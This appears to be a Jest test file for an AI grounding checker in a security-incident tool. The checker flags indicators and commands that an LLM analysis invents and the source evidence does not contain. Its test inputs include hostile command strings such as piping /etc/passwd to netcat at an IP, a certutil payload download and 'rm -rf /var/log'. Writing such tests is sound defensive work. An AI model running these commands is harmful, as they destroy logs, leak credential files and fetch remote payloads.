import { checkGrounding } from '../src/domain/ai/aiGrounding';
import { RecommendationContextBuilder } from '../src/application/recommendation/services/RecommendationContextBuilder';
const hash = 'a'.repeat(64);
const sources = ['192.0.2.10', hash, 'WKS-01', 'server.example.com', 'https://example.com/a', '2001:db8::1', 'curl https://example.com/a'];
test.each(['192.0.2.10', hash, 'WKS-01', 'server.example.com', 'https://example.com/a', '2001:db8::1'])('legitimate source indicator: %s', value => {
  expect(checkGrounding(`Observed ${value}`, sources).status).toBe('GROUNDED');
});
test.each(['192.0.2.1', 'b'.repeat(64), 'WKS-02', 'worker-99', 'hostname phantom', 'evil.attacker.security', 'https://example.com/ab', '2001:db8::2', '`powershell -enc ZmFrZQ==`'])('invented indicator or command: %s', value => {
  expect(checkGrounding(`Observed ${value}`, sources).status).toBe('UNGROUNDED');
});
test('NO_MATCH / ERROR / TIMEOUT remain original facts, with no benign/clean rewriting', () => {
  const summary = 'NO_MATCH; ERROR; TIMEOUT';
  expect(checkGrounding(summary, [summary]).status).toBe('GROUNDED');
  expect(summary).toBe('NO_MATCH; ERROR; TIMEOUT');
});
test('invalid AI output is excluded from trusted recommendation context and retained unchanged for review', async () => {
  const summary = 'Invented 203.0.113.99';
  const analysis = { summary, keyFindings: [], grounding: checkGrounding(summary, sources) };
  const context = { getIncidentContext: async () => ({ incidentId: 'i', investigationNumber: 1, title: 'Observed alert', status: 'open', priority: 'high', alertSeverity: 'high' }), getIocs: async () => [], getMitreMappings: async () => [], getEvidence: async () => [], getLatestAiAnalysis: async () => analysis };
  const builder = new RecommendationContextBuilder(context as never, { findAll: async () => [] } as never, { findAll: async () => [] } as never);
  expect((await builder.build('i', 't')).value.aiAnalysis).toBeNull();
  expect(analysis.summary).toBe(summary);
});


// Core-workflow run 2026-09-26: a real LLM analysis of a real Wazuh 5712 alert backticked field names and a
// threat-intel verdict (`frequency`, `previous_output`, `UNKNOWN`) and was wrongly marked UNGROUNDED — excluding a
// correct analysis from the Recommendation context. A backtick span is a command only when it reads like one.
test('Markdown code spans of single field names / values are not commands', () => {
  const src = ['198.51.100.122', 'wazuh.manager', 'vigixcore'];
  const text = 'Rule `5712` fired (`frequency` 8, see `previous_output`) from `198.51.100.122` against `vigixcore`; threat-intel verdict `UNKNOWN`.';
  expect(checkGrounding(text, src)).toEqual({ status: 'GROUNDED', ungrounded: [] });
});
test.each(['`rm -rf /var/log`', '`whoami`', '`cat /etc/passwd | nc 203.0.113.9 4444`', '`certutil -urlcache -f http://x/a.exe a.exe`'])('command-like code spans are still checked: %s', (span) => {
  expect(checkGrounding(`Run ${span} on the host.`, ['198.51.100.122']).status).toBe('UNGROUNDED');
});
test('an invented IP inside a code span is still caught', () => {
  expect(checkGrounding('Block `203.0.113.99` now.', ['198.51.100.122']).status).toBe('UNGROUNDED');
});
